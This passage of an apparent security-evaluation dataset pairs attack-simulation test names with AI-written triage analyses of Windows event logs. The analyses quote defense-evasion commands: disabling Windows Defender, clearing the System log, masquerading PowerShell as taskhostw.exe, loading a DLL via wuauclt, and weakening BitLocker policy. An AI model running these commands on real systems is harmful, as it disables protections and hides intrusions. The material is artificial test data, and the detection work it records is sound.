    `reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration"" /v Notification_Suppress /t REG_DWORD /d 1 /f`
    
    This change is an indicator of potentially malicious activity as it could attempt to disable security notifications to hide potential threats.

### Application and System Updates
- **Microsoft Edge Update Activity**: Logs indicate regular system updates for Microsoft Edge. This activity seems benign as it aligns with normal automated update processes for Edge.

### Conclusion
- Multiple suspicious activities have been detected in the logs, such as unauthorized time changes, high-level privilege use, remote login from an unusual IP, and a critical change to security settings.
- The steps outlined above could indicate an attempted compromise or preparation for further malicious activities. The pattern suggests the need for vigilance and potential escalation.

### Resolution
- **SUSPICIOUS**: The logs contain several activities that don't align with typical user behavior and need further investigation. A more comprehensive review of additional logs including network traffic, user activity, and system configuration changes is recommended. Moreover, the ""admin_test"" account's activities and the remote login should be verified against expected behavior and legitimate business processes."
Masquerading - powershell.exe running as taskhostw.exe,"Upon reviewing the provided Windows event logs, particularly focusing on the PowerShell, Sysmon, and security events, I have identified several noteworthy entries that warrant further discussion:

### Key Findings:

1. **Suspicious PowerShell Execution via `taskhostw.exe`**:
   - The Windows PowerShell logs indicate that a PowerShell process was initiated with `taskhostw.exe` located in `C:\Users\admin_test\AppData\Roaming\`. This pattern of using a benign appearing filename and location such as `AppData` is often indicative of malicious activity such as persistence mechanisms employed by malware.
   - The command line for PowerShell is empty in logs, but the presence of a copied `PowerShell` executable under a suspicious name (`taskhostw.exe`) in user-specific locations is commonly used by attackers to evade detection.

2. **Sysmon Logs Indicate Potential File Manipulation and Command Execution**:
   - The event with `cmd.exe` executed the following command:  
     ```cmd
     ""cmd.exe"" /c copy %%windir%%\System32\windowspowershell\v1.0\powershell.exe %%APPDATA%%\taskhostw.exe /Y & cmd.exe /K %%APPDATA%%\taskhostw.exe
     ``` 
     This shows an attempt to copy `powershell.exe` to `taskhostw.exe`, which is then executed. This behavior is highly indicative of an attacker setting up a backdoor or persistence mechanism. 
   - The later events show the execution of `taskhostw.exe` which aligns with this potentially malicious behavior.

3. **Security Audit Event with Elevated Privileges**:
   - Security events indicated privilege assignments such as `SeBackupPrivilege` and `SeDebugPrivilege` which are sensitive and highly privileged rights usually not required for normal operations, raising suspicion of privilege escalation or misuse.
   - Several logon events showed elevated tokens (`ElevatedToken=%%1842`) for the `admin_test` account which might indicate elevated permissions by default or due to some malicious intent.

4. **Unusual Sysmon Activity**:
   - There are multiple Sysmon events related to service start-ups and parent-child relations that can appear benign, yet in the context of other activities, they potentially indicate attempts to control services, or possibly, lateral movement.

### Conclusion and Recommendations:

Based on the analysis, there are multiple indicators of potentially malicious activity:
- The manipulation of PowerShell executables and subsequent executions via unusual paths and executables (i.e., `taskhostw.exe`).
- The presence of logs indicating possible privilege escalations.
- The executed `cmd.exe` commands that align with common persistence and evasion techniques.

Given the above findings, the assessment of this situation is **MALICIOUS**. It warrants immediate attention to contain potential threats, such as:

- Isolate the affected host (`Server002`) to prevent any outgoing connections which may facilitate further administrative illegal actions.
- Conduct a full forensic investigation on `Server002` to identify any altered files, services, and registry changes.
- Review user accounts, especially `admin_test`, and audit all usage of privileged accounts/settings across the network.
- Update antivirus definitions and scan the system to catch any known malware signatures.
- Consider implementing tighter PowerShell execution policies and or application whitelisting to prevent similar future occurrences. 

The evidence points to ongoing malicious activity which needs immediate containment and investigation."
Load Arbitrary DLL via Wuauclt (Windows Update Client),"After a thorough review of the Windows event logs provided, several key observations and assessments have been made:

### Analysis

1. **Frequent Use of `wevtutil.exe` and `conhost.exe`**:
   - The logs show multiple executions of `wevtutil.exe` and `conhost.exe` in tandem:
     - `C:\\Windows\\System32\\wevtutil.exe`
     - `C:\\Windows\\System32\\conhost.exe`
   - These are legitimate Windows binaries. `wevtutil.exe` handles event logs, and `conhost.exe` is needed for console window hosting in Windows. However, frequent execution of `wevtutil.exe` can be suspicious if not consistent with normal logging activities, as it might indicate log tampering or querying.

2. **Execution of `wuauclt.exe` with Unusual Parameters**:
   - The command: `""cmd.exe"" /c wuauclt.exe /UpdateDeploymentProvider ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\calc.dll"" /RunHandlerComServer`
   - This line suggests that `wuauclt.exe`, which is normally used for Windows Update, is being leveraged to interact with a suspicious DLL (`calc.dll`) in a temporary user directory. Such a pattern can be indicative of a DLL hijacking or execution of unintended code.

3. **Elevation of Privileges**:
   - Logs show use of processes like `wsmprovhost.exe` that are running with high integrity levels — suggestive of administrative privilege level.
   - Security Event 4672 logs indicate Special privileges assigned to the SYSTEM account, consistent with normal privileged operations for system processes.

4. **Process Chains Involving Known Windows Utilities**:
   - There are several process creation events involving legitimate Windows executables like `whoami.exe`, `hostname.exe`, and `cmd.exe`. The connections and originating processes do not appear to form typical user activity patterns.

5. **Lack of PowerShell Script Block Logging**:
   - Absence of detailed PowerShell event logs despite the `powershell.exe` execution logs. Usage of PowerShell without script block logging can indicate scripts running silently, which is concerning if seen in abnormal contexts.

### Assessment

- **Suspicious Activity**: The manipulation of `wuauclt.exe` with parameters leading to a DLL (`calc.dll`) is highly indicative of possibly malicious behavior, possibly an attempt to execute or inject code via `wuauclt.exe`. This and the frequent querying or potential tampering with event logs using `wevtutil.exe` warrant further investigation.
  
- **Privilege Use**: The operations run under a high privilege level, including SYSTEM with significant privilege allocations captured in events, align with potentially deliberate attempts to maintain persistence or achieve certain task executions without user interference or restrictions.

### Guidance

- **Immediate Action**: A deeper forensic analysis is necessary into the source and nature of `calc.dll` within the specified path. Ensure that the DLL in question is verified and checked against known threat databases.
  
- **Monitoring and Alerts**: Set active monitoring for repeated invocations of `wevtutil.exe` and specific PowerShell operations to detect potential log manipulations or suspicious scripting activities.
  
- **Environment Hardening**: Consider implementing stricter PowerShell logging and execution policies, such as Constrained Language Mode, and restrict access to administrative tasks and tools.

### Resolution: SUSPICIOUS

Based on the analysis, the activities logged are suspicious as they potentially camouflage malicious exploitation and persistence techniques, especially the misuse of `wuauclt.exe` and possible attempts at event log manipulation. This requires further investigation to confirm or dismiss malicious intent."
Invoke-ATHRemoteFXvGPUDisablementCommand base test,"**Analysis of Logs:**

1. **Security Logs:**
   - Events with IDs 4798 and 4799 primarily involve enumeration of local users and groups through the CompatTelRunner.exe process. CompatTelRunner.exe is a known telemetry component in Windows. The access alignment shows a query of system accounts like ""Administrator,"" ""Guest,"" ""DefaultAccount,"" and others. It's odd that a telemetry process is querying so many local accounts in such a rapid sequence, especially since the telemetry process doesn't typically operate this way or require extensive domain knowledge about user accounts.
   - Event ID 4672 involves special privileges assigned to the SYSTEM user, which is typical and benign for system processes.
   
2. **Sysmon Logs:**
   - Multiple executions of the process `wevtutil.exe` (a Windows utility used for event log management) and `conhost.exe` in a short time span by the user `SERVER002\admin_test` can suggest an attempt to tamper with or access event logs. Frequent execution of `wevtutil.exe` might indicate an attempt at log clearing or viewing sensitive event log entries.
   - The presence of multiple PowerShell activities indicates script execution. Some scripts executed (`Invoke-ATHRemoteFXvGPUDisablementCommand`) appear non-standard (custom script or module potentially used), which warrants concern given the unusual timing and context of its execution.

3. **PowerShell Logs:**
   - The PowerShell logs confirm the execution of non-standard scripts related to RemoteFX, possibly indicating an attempt to disable Virtual GPU or tamper with related settings. The command executed with PowerShell is not typical for standard operations in a secure enterprise environment without explicit necessity.

**Assessment:**
The logs indicate **suspicious activity** based on several criteria:
- Unusual behavior of CompatTelRunner.exe querying multiple accounts rapidly, which is atypical for its standard telemetry role.
- Repeated and clustered execution of `wevtutil.exe`, possibly signifying logs manipulation or examination initiated by the `admin_test` account.
- Execution of potentially malicious or unauthenticated PowerShell commands related to system configurations.

**Resolution: SUSPICIOUS**

**Guidance and Next Steps:**
1. **Investigate the 'admin_test' account**: Verify the legitimacy of this account, its recent activities, and any associated anomalies.
2. **Check for Persistence Mechanisms**: Look for any modifications or additions to the startup scripts or registry indicating persistence mechanisms.
3. **Integrity of Telemetry Processes**: Verify the integrity of `CompatTelRunner.exe` and ensure that it has not been replaced or tampered with.
4. **Endpoint Review and Isolation**: Conduct an in-depth endpoint review and, if necessary, isolate affected systems for further forensic analysis.
5. **Log Security and Continuity**: Ensure logs are secure, check for any deletions or alterations, and implement increased logging to monitor suspicious future activities.
6. **Audit PowerShell Activities**: Use PowerShell logging to track script origin, content, and modifications to system configurations. 

Consider contacting internal threat detection teams or external cybersecurity experts if deeper forensic investigation is necessary."
Create Windows System File with powershell,"After examining the provided Windows event logs, here is my analysis:

### Summary of Findings:

1. **EdgeUpdate Service Events:**
   - Multiple instances of `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe` run under the NT AUTHORITY\SYSTEM account are observed, which is typical for system service updates.
   - The service is seen stopping and processes associated with update tasks being executed repeatedly.

2. **Command-Line Activities:**
   - The command `cmd.exe` with arguments checking the existence of `%temp%\data.txt`, and writing data to it is noticed. This might be part of a script or automated task.
   - Executions of PowerShell with a command line that alters the file attributes of `%temp%\data.txt` are seen. While PowerShell is a versatile tool, the usage of `$file.attributes='System'` suggests an intent to hide or manipulate a file, which is suspicious.

3. **Process Integrity and Execution Context:**
   - Activities are executed with high integrity level by the user `SERVER002\admin_test`. While high-integrity levels may suggest privileged operations, they are not uncommon for administrative users.
   - The `wsmprovhost.exe` is noted as a common parent process, indicating script-driven operations likely over Windows Remote Management (WinRM).

4. **Miscellaneous Activities:**
   - Execution of built-in utilities like `hostname.exe` and `whoami.exe` further confirms the running of scripts for system information retrieval.

### Assessment and Recommendations:

The presence of PowerShell operations with commands modifying file attributes to 'System' is particularly concerning as it can be indicative of attempts to obfuscate activities or data from system users or administrators. Similarly, creating data files in the temp directory may suggest data staging activities.

- **Threat Level Assessment:** SUSPICIOUS

Activities logged appear to exhibit characteristics that warrant further investigation. The operations aren't outright malicious but do present behaviors that deviate from typical update operations and can potentially align with suspicious activities like script-based exploitation or evasion tactics.

#### Next Steps:
1. **Validation of User Intent:** Investigate if the activities by `SERVER002\admin_test` were authorized, verifying any scripts or scheduled tasks the user might have deployed intentionally.
2. **Audit PowerShell Scripts:** Review PowerShell logging for detailed command execution to determine if the script aligns with any known attack patterns or administrative tasks.
3. **Isolate and Investigate:** Temporarily isolate the system if you suspect data exfiltration risks, and conduct further forensic analysis.
4. **Monitoring and Alerts:** Adjust monitoring alerts around sudden PowerShell executions and modification of system or hidden file attributes in temp folders.
5. **Security Baseline Review:** Double-check that the current security baselines, especially regarding privilege use and sensitive directory monitors, are in place and up to date.

Overall, while no direct evidence of compromise is present, the context around these behaviors necessitates a closer look to rule out or confirm potential security implications."
Clear Logs,"Upon reviewing the provided logs, several insights and observations can be made about the activities logged on the Windows Host named Server002.

### Observations:
1. **Edge Update Activity**: There is a series of entries related to Microsoft Edge Update. These involve process executions including MicrosoftEdgeUpdate.exe and its associated components such as MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe. The activities include update, registration, and service start commands (e.g., `/update`, `/regsvc`, `/svc`). The activities logged are consistent with normal update behavior for Microsoft Edge.

2. **Command Line Operations**:
   - A notable command-line execution of `whoami.exe` and `hostname.exe` was observed. Both commands are typically used for legitimate administrative or scripting purposes to determine the current user and system identity respectively. Both were executed with high integrity level by the user `SERVER002\\admin_test`.
   - More concerning is the execution of `cmd.exe` with the command line argument for clearing the System event log (`wevtutil cl System`). This activity can suggest an attempt to cover tracks or disrupt regular logging, which often signifies malicious intent.

3. **Process Relationships**:
   - The execution flow in the sysmon logs shows interactions between several known Windows system processes (e.g., wsmprovhost.exe), which were the parent processes for common administrative tools. This doesn't indicate direct maliciousness, but context around log clear activity may alter that viewpoint.
   
4. **Other Services**:
   - The Software Protection Platform Service and Edge Update stopping entries found in the application logs suggest ordinary system and third-party management activities, rather than any untoward action.

### Suspicious Activities:
- **Event Log Clearance**: The command to clear system events `wevtutil cl System` stands out as anomalous, given it is often used by attackers to erase evidence of their actions after compromising a system. This does not typically form part of regular administrative tasks, unless done with proper change management processes or automation in place.

Based on the activity observed, the following conclusions can be made:

### Conclusion:
**Resolution: SUSPICIOUS**: While the majority of the events in the logs can be attributed to normal system maintenance and application updates, the specific command to clear system logs (`wevtutil cl System`) is suspicious and warrants further investigation. This action, when coupled with no clear evidence of corresponding legitimate administrative task, raises potential concerns around unauthorized access or malicious activity.

### Recommendations:
1. **Further Investigation**: Investigate the source and reason behind the `wevtutil cl System` command. Check if there's a legitimate reason or scheduled task responsible for this action. Contact any responsible administrators to confirm if this was authorized.
   
2. **Audit and Access Review**: Review accounts and access logs for the `SERVER002\\admin_test` account, including any elevated permissions or recent password changes.

3. **System and Network Monitoring**: Employ enhanced monitoring and alerting for this host, particularly for any commands related to event log manipulation (`wevtutil`, `Clear-EventLog`, etc.).

4. **Incident Response**: If no legitimate cause for the log clearance is found, engage the incident response team to assess potential compromise and mitigate risks. Consider system isolation, data integrity validation, and a full security audit."
DLP Evasion via Sensitive Data in VBA Macro over email,"Upon detailed analysis of the Windows event logs provided, several entries demonstrate potentially suspicious activity. Here are the key findings:

1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:**
   - `wevtutil.exe` and `conhost.exe` were frequently executed closely together in the log entries. While both are legitimate Windows processes, frequent executions in quick succession could indicate a script or automated process being executed. `wevtutil.exe` is used for querying and managing event logs, which may be benign or could potentially be used maliciously for log clearing.

2. **PowerShell Usage:**
   - A PowerShell command was run to execute `Send-MailMessage` with an attachment (`data-cc-macro.xlsm`). This could potentially be used for data exfiltration. The command uses an internal SMTP server (`127.0.0.1`) which reduces visibility externally, suggesting an attempt to mask the activity.

3. **Use of `whoami.exe`:**
   - The execution of `whoami.exe` was logged. While this could be routine, in conjunction with other suspicious activity, it could indicate attempts to gather user information or check current permissions on the system.

4. **Security Log Events:**
   - Several security log entries with Event ID 5379 indicate unsuccessful attempts to retrieve credentials using Microsoft Account and Windows Live credentials. The specific return code and repetitive attempts might suggest malicious attempts at account enumeration or compromise.

**Assessment:**

- The presence of `PowerShell` usage in conjunction with `Send-MailMessage` and file attachments, plus the repetitive use of system utilities such as `wevtutil.exe`, `conhost.exe`, and `whoami.exe`, are indicators consistent with malicious activity, including potential data exfiltration or indicator hiding (e.g., event log tampering).

- The security logs reflect failed credential reading operations, which could mean brute force or another unauthorized attempt to access accounts.

**Resolution: SUSPICIOUS**

While these activities could theoretically be automation tasks or administrative actions, they do not align well with typical operational behaviors, especially given the PowerShell script and associated file transfer. Further investigation is warranted to determine the intent and ensure no compromise occurred.

**Guidance on How to Proceed:**

1. **Containment:**
   - Monitor the system closely for further suspicious activity.
   - Consider isolating the host from the network until further investigation clarifies the activities' nature.

2. **Investigation:**
   - Review the file `data-cc-macro.xlsm` for any malicious macros or scripts.
   - Check for additional PowerShell scripts or scheduled tasks configured on the system which might indicate persistence mechanisms.

3. **Monitoring and Alerting:**
   - Set up alerts for the execution of `PowerShell` commands, particularly those involving `Send-MailMessage` or attachments.
   - Increase logging and monitoring of any events associated with credential access attempts on the network.

4. **Remediation:**
   - If malicious activity is confirmed, follow incident response procedures to remove any persistence mechanisms and clean the system.

5. **Educate and Train:**
   - Conduct awareness sessions for system administrators and users regarding secure scripting practices and potential indicators of compromise."
Rundll32 setupapi.dll Execution,"Upon reviewing the provided Sysmon log entries, the following observations and analysis can be made:

### Suspicious or Anomalous Behavior:

1. **Frequent Execution of `wevtutil.exe`:**
   - Logs show multiple instances of `wevtutil.exe` execution. This utility is used to export, archive, and clear event log files and could be used by an attacker to cover their tracks by clearing application, security, or system logs.

2. **Use of `rundll32.exe` with `setupapi.dll`:**
   - The command-line entry for `rundll32.exe` indicates a call to `setupapi.dll` to install an INF file located in a temp directory. This behavior is highly suspicious since `rundll32.exe` is often used by attackers to execute arbitrary code in DLLs, and the use of a DLL related to setup and installation in a temp directory is atypical for legitimate software.

3. **Frequent Execution of Command Line Tools:**
   - There are entries showing the execution of `cmd.exe`, `whoami.exe`, and `hostname.exe` under the same user, which might indicate reconnaissance activities such as identifying the user context (`whoami`), the host (`hostname`), and executing commands via `cmd.exe`.

4. **Execution Context:**
   - Many processes, including potentially suspicious ones (like `rundll32.exe`), are executed with high integrity levels, which can involve elevated privileges that might be indicative of privilege escalation attempts.
  
5. **Absence of Normal Logging Activities:**
   - Although Sysmon logs are provided, there is an absence of application, security, and system logs. This absence is itself suspicious and could mean they have been cleared or not captured.

### Assessment of the Situation:

Based on the above observations, there are multiple flags indicating suspicious activity. The frequent and simultaneous executions of processes like `wevtutil.exe` and `rundll32.exe` with particular command-line arguments suggest possible malicious activity. The actions seen could be part of a script or automated attack attempting to manipulate the system’s event logs or execute malicious payloads.

### Resolution:

- **SUSPICIOUS:** The logs contain activities indicative of potential misuse or malicious acts such as log tampering and unauthorized execution of commands through `rundll32.exe`. More investigation is needed to confirm the intention behind these activities.
  
### Guidance on How to Proceed:

1. **Further Investigation and Monitoring:**
   - Conduct a more detailed forensic analysis of the host to check for indications of compromise not visible in logs.
   
2. **Containment and Response:**
   - Monitor the system closely for any further suspicious activities. Consider isolating the system if further malicious activities are detected.
   
3. **Verify Integrity of Logs and Files:**
   - Ensure the integrity and completeness of all relevant logs. Check for any cleared or missing logs since they might hold more information on the suspicious activities.

4. **Audit User Activity:**
   - Check the activities of the user `SERVER002\\admin_test` involved in these suspicious process executions. Review their access permissions and recent activities.

5. **Conduct a Security Assessment:**
   - Perform a full security assessment of Server002 and the network to identify any additional security misconfigurations or vulnerabilities."
Event Viewer Registry Modification - Redirection URL,"After analyzing the provided Windows event logs, here are the key observations:

1. **Legitimate Process Activity:**
   - Multiple legitimate system processes like `MicrosoftEdgeUpdate.exe`, `wevtutil.exe`, `conhost.exe`, and `whoami.exe` are executed. These processes by themselves are not inherently malicious and are common on Windows systems.

2. **Registry Modification:**
   - A potentially suspicious command was identified: 
     ```
     cmd.exe /c reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer"" /v MicrosoftRedirectionURL /t REG_SZ /d ""file://C:\windows\system32\notepad.exe"" /f
     ```
     This command modifies the registry to change the default handler for Event Viewer redirection URLs to Notepad. Such behavior can be indicative of malicious intent, potentially redirecting users away from viewing actual logs to prevent detection. It could be an attempt to hide logs or mislead users.

3. **Process Execution and Parent-Child Relationships:**
   - The suspicious `cmd.exe` execution originates from a high-integrity level and is executed by the user `SERVER002\admin_test`. There is a chain of child processes (such as `conhost.exe` and `reg.exe`) that support its execution.
   - This command sequence is unusual and usually not performed during regular operations. This could indicate an attempt to obfuscate or alter logging behavior on the system.

4. **Behavior of Edge Update Processes:**
   - There is continuous activity associated with `MicrosoftEdgeUpdate.exe`, which appears to be legitimate given the context of update-related tasks starting and stopping as expected. The presence of specific command-line arguments and file paths seem to align with routine updates for Microsoft Edge through `edgeupdate`.

**Assessment:**

- **Suspicious Activity:**
  - The specific registry modification via `cmd.exe` command is suspicious. While not confirmed as malicious, this behavior could be part of a tactic used by an adversary to obfuscate system logging or hide malicious activities. This warrants further investigation.

- **Malicious Indicators:**
  - No definitive malicious events are identified from the provided logs. However, the registry manipulation raises a red flag, which could have security implications.

**Resolution: SUSPICIOUS**

**Recommended Actions:**
1. Investigate the context of the user `SERVER002\admin_test` and their recent activities. Determine if the behavior was expected or an anomaly.
2. Validate the integrity of these registry settings and assess if they have been unauthorized modified.
3. Consider monitoring the system more closely for similar registry changes or unusual system configurations.
4. Reach out to involved users (if applicable) to confirm whether these changes were intentional or recognized.
5. Conduct a deeper analysis with additional logs or contextual data available to ascertain any missed indicators of compromise.

This cautious approach ensures that any potential threat is addressed promptly without prematurely concluding a benign activity."
Activate Windows NoFileMenu Group Policy Feature,"Upon analyzing the log entries, I have identified the following points of interest:

1. **Time Change Anomaly**: 
   - The system time was changed multiple times by the process `svchost.exe`, as evidenced by Event IDs 4616 and the Kernel-General events related to time changes. This could be indicative of certain conditions where the attacker has manipulated the system time to evade detection. However, this activity alone, especially without direct context or additional indicators of compromise, is often observed in legitimate operations like time synchronization via NTP. 

2. **Privileged Account Activity**:
   - There are several log entries (Event ID 4672) that record the use of elevated privileges by the user `admin_test`. The privileges listed are extensive, including `SeDebugPrivilege`, `SeBackupPrivilege`, and `SeImpersonatePrivilege`, among others. While this could be normal for an administrator, if the account `admin_test` is not expected to perform such actions regularly, it could be suspicious. 

3. **Use of `svchost.exe` and `conhost.exe`**:
   - While `svchost.exe` and `conhost.exe` are legitimate system processes, they are also known to be used by attackers to mask their activities. In the logs, we see `conhost.exe` associated with several events. Without explicit malicious command-line activity or context, `conhost.exe` usage itself isn't definitive evidence of compromise.

4. **Registry Modification with High Integrity Level**:
   - There is an event where `cmd.exe` was used to execute a registry modification via `reg.exe`. The command altered a policy setting in the Explorer policies (`NoFileMenu`). This could potentially be used to control certain user interface elements maliciously. Importantly, this action was performed with High Integrity Level, indicating elevated privileges were utilized, likely by `admin_test`.

5. **Microsoft Edge Update Processes**:
   - There are several events related to Microsoft Edge Update (e.g., `MicrosoftEdgeUpdate.exe`). These are part of regular update activities for Microsoft software, and unless these are subverted processes delivered by attackers (e.g., via crafted edge update packages), they are not inherently malicious.

**Assessment**:
- **SUSPICIOUS**: Based on the analysis, there are several activities that warrant further investigation:
  - The time changes by `svchost.exe`,
  - Elevated privileges used by `admin_test`,
  - Registry modifications carried out by `cmd.exe`.
  
These activities, especially in combination, could indicate potential security concerns such as privilege abuse or evasion techniques.

**Guidance on How to Proceed**:
1. Cross-reference the time change events with organization policies on time synchronization and verify whether they're executed by authorized services.
2. Review the usage of the `admin_test` account for legitimacy, especially focusing on the time and nature of privilege usage.
3. Investigate the registry modification further to see if it aligns with normal operational behavior or if it could indicate unauthorized changes.
4. Incorporate additional endpoint detection response (EDR) solution capabilities to monitor these processes' future activities.
5. Perform a manual review or automated comparison of the system to known baselines to identify unauthorized changes or anomalies.

Proceed with these steps to ensure that the identified suspicious activities are either confirmed benign or mitigated if found malicious."
Modify EnableNonTPM Registry entry,"After careful analysis of the provided log entries, here is a detailed assessment:

### Observations:

1. **Frequent Usage of `wevtutil.exe`, `conhost.exe`, and `HOSTNAME.EXE`:**
   - The logs display multiple executions of `wevtutil.exe`, `conhost.exe`, and `hostname.exe`, executed by the `SERVER002\admin_test` account.
   - `wevtutil.exe` is a legitimate Windows utility used to manage Windows Event Logs. Frequent use without clear justification in short periods can be suspicious if unexpected in typical operations.

2. **Command Line Observations:**
   - `cmd.exe` running with the command `reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableNonTPM /t REG_DWORD /d 1 /f` is setting a registry key related to BitLocker configurations which allows non-TPM operations. Modifying security policies can be indicative of an attempt to lower security settings.

3. **Execution Context and User Account:**
   - All observed actions are performed by `SERVER002\admin_test`, significantly centralizing activity around one user which might indicate misuse.
   - The use of the high integrity level suggests elevated privileges, implying potential for unauthorized or harmful changes.

4. **`whoami.exe` Execution:**
   - This utility displays user account information and, while legitimate, it could be used by an adversary to ascertain their level of access.

5. **Lack of PowerShell and Security Logs:**
   - There is an absence of PowerShell logs which might indicate either a non-use of PowerShell or potentially blinding monitoring systems if PowerShell was used.

6. **Service Executions:**
   - The logs record services like `svchost.exe`, `sppsvc.exe`, and `WmiPrvSE.exe`, which are typical Windows processes, running under their expected authority accounts, indicating baseline system activity.

### Assessment:

- **Indicators of Malicious Activity:**
  - Though typical system utilities are being executed, the modification of BitLocker policy is potentially concerning, indicating an effort to alter system security settings.
  - Centralized activity from a single user account for various system utilities, particularly involving high integrity level commands and registry editing.

### Conclusion:

The logs reflect SUSPICIOUS activity primarily due to the following:
- Registration changes to BitLocker policy potentially decreasing security without a known and legitimate purpose.
- Concentrated use of administrative functions and utilities by a single user account, which can deviate from standard activity profiles especially if the `admin_test` account isn’t supposed to be performing these actions frequently or outside typical administrative duties.

### Recommendations for Further Investigation:
- Validation of any administrative tasks or changes that `admin_test` was expected to perform during this time frame.
- Review of user account and permissions, ensuring that such elevated command execution was authorized.
- Consider deploying more comprehensive auditing and monitoring to capture potential unnoticed PowerShell, network, or further registry activities.
- Validate with IT or security governance if such a registry change aligns with internal policies.

Resolution: **SUSPICIOUS** – The activity doesn't look right and needs more investigation."
Tamper with Windows Defender Command Prompt,"### Detailed Analysis

#### Application Log Analysis
- **Edge Update Events**: The entries concerning ""edgeupdate"" indicate that the service started and stopped normally. This behavior is consistent with regular updates to Microsoft Edge. No immediate red flags are noted from this, as they are typical application log messages for system or application updates.
  
- **Software Protection Platform Service**: The entry indicates a normal operation of the Software Protection Platform Service, mentioning ""RulesEngine"", which is standard for licensing compliance checks.

#### Security Log Analysis
- **Event ID 4616** (System Time Change): The logs show events where system time was changed. These are typically triggered when the system synchronizes its time with an external time source (e.g., via NTP). No direct evidence of tampering or malicious activity is deduced from these entries.
  
#### Sysmon Log Analysis
- **Network Utilities and Scripting**:
  - Multiple process executions like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` are observed. While such utilities can be used during legitimate administration and maintenance tasks, they can also be indicative of lateral movements and information gathering if not aligned with normal administrative activities.
  - **Potentially Malicious Command**:
    - **Command Execution**: There is a `cmd.exe` process executing a script to stop the Windows Defender (`WinDefend`) service and disable it, with command-line arguments: `sc stop WinDefend & sc config WinDefend start=disabled & sc query WinDefend`.
    - This action is highly suspicious as it aims to disable antivirus protections, potentially to avoid detection of other malicious activities. This is considered a significant indicator of malicious intent.
      
- **Microsoft Edge Update Processes**: Several instances and versions of `MicrosoftEdgeUpdate.exe` are observed. The command lines and the systematic nature of these entries indicate routine update checks rather than malicious execution.
  
#### System Log Analysis
- **Kernel and Time Service Events**: Logs indicating time service adjustments using NTP (Network Time Protocol) appear. These are expected for synchronizing system time accurately and do not show signs of direct compromise.
  
### Threats or Risks Identified
- **Disabling Windows Defender**: The `cmd.exe` execution to stop and disable Windows Defender is a strong indicator of potential compromise. Disabling security services can be part of a broader attack strategy to evade detection and persist within the environment.

### Guidance 
Proceed with caution given the evidence:
1. **Immediate Action**: Verify the source of the commands issued to disable Windows Defender. If unauthorized, take immediate steps to re-enable Defender and initiate an incident response protocol.
2. **Investigate User Activities**: Review the activities of users involved, specifically focusing on `admin_test`. Determine if their actions are authorized or if their credentials are compromised.
3. **Conduct a Full System Scan**: Use a known, trusted security tool to scan the system for malware or unusual activities perpetuating this behavior.
4. **Network Monitoring**: Start monitoring for lateral movement attempts, data exfiltration signs, and unusual outbound network activities.

### Resolution
**Resolution: MALICIOUS** - The logs contain activity indicating a potential compromise due to the explicit disabling of Windows Defender, which suggests malicious intent and actioning."
Allow RDP Remote Assistance Feature,"### Detailed Analysis:

1. **System Log Analysis:**
   - The Windows Kernel-General events (Event ID 1 and 24) indicate time changes made by the system. Such events can result from normal operations like patching or synchronization with a time server (time.windows.com). The time change doesn't appear malicious as it's a common administrative task performed by svchost.exe, a legitimate Windows system process.

2. **Application Log Analysis:**
   - The Microsoft-Windows-Security-SPP (Event ID 16384) refers to the Software Protection Platform Service. The event indicates timing rules and operational information but doesn't show any signs of tampering or irregularities.

3. **Sysmon Log Analysis:**
   - Multiple Sysmon events (Event ID 5) reveal a high frequency of process creation logs. Executables like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe` were observed.
   - **Key Observations**:
     - `cmd.exe` was used to execute a registry modification command to allow remote assistance (`reg add ... fAllowToGetHelp`). This action modifies system configuration, indicating a potential security risk or intentional change. This activity warrants further investigation.
     - The `hostname.exe` and `whoami.exe` processes represent standard queries for system and user information, which could be indicative of internal or external reconnaissance.
     - The use of `wevtutil.exe` in the list may suggest the possible clearing or manipulation of event logs, which is often used to cover malicious tracks.

4. **Security Log Analysis:**
   - Event ID 4616 indicates a system time change performed by svchost.exe. This repeats information found in the system logs and does not appear malicious by itself.

### Assessment:

The logs provide evidence of potential malicious activity, specifically concerning the registry modification via `cmd.exe` and the presence of `wevtutil.exe` usage which could be seen in attempts to hide audit trails by clearing logs. 

### Recommendation:
1. **SUSPICIOUS**: The registry modification is suspicious and should be investigated to validate its legitimacy (i.e., cross-reference with change management records).
2. **Next Steps**:
   - Further investigate the context and origin of the `cmd.exe` command, specifically who issued it and why.
   - Review security policies around registry changes and remote assistance configurations.
   - Check for any unauthorized external access following the registry change.
   - Examine the use and intent of `wevtutil.exe` to ascertain if log files were tampered with.
   - Assess user activity related to `SERVER002\admin_test` for any unauthorized access patterns.

Given the identified activities and the context provided by the logs, investigation should continue to clarify the intent and extent of the observed behavior."
Remove Network Share,"After analyzing the provided logs, the following observations and conclusions can be made:

### Observations:

#### Security logs:
- Events relate to changes in system time by `svchost.exe` under the `LOCAL SERVICE` account. Frequent time changes could be suspicious but are typically part of routine network time synchronization, especially when involving `svchost.exe`.

#### Application logs:
- Applications being updated and services such as `edgeupdate` are stopped, which appear to be normal behavior for software updates.

#### Sysmon logs:
- There is significant activity involving `wevtutil.exe` and `conhost.exe`, executed by the user `admin_test`. Frequent execution of `wevtutil.exe` may be suspicious if not part of regular administrative activities, as it's used for managing Windows Event Logs.
- Execution of `cmd.exe` with a command to delete a network share (`net share \\test\share /delete`) is noted. This action executed by the `admin_test` account may indicate activity requiring further verification to understand its context.
- Regular activity related to Microsoft Edge updating services is observed, typically benign unless linked with unusual patterns.

#### System logs:
- There are entries recording system time changes, again aligning with potential routine time synchronization events.

### Suspicious or Anomalous Activities:
- The execution of `wevtutil.exe` and `cmd.exe` with specific command-line arguments by user `admin_test` stands out. This user executed multiple system utilities and commands rapidly, including a network share deletion, which might be indicative of potentially suspicious administrative behavior or automation scripts.
  
### Assessment and Conclusion:
- **SUSPICIOUS**: The observed activities reflect potentially legitimate administrative tasks; however, the nature and frequency of specific process executions, especially related to event logs and network shares, warrant a deeper investigation. The fact that these are performed by a singular user `admin_test` during a short period raises concerns about unauthorized or unintended script or task execution without clear change management traces or justifications.

### Guidance:
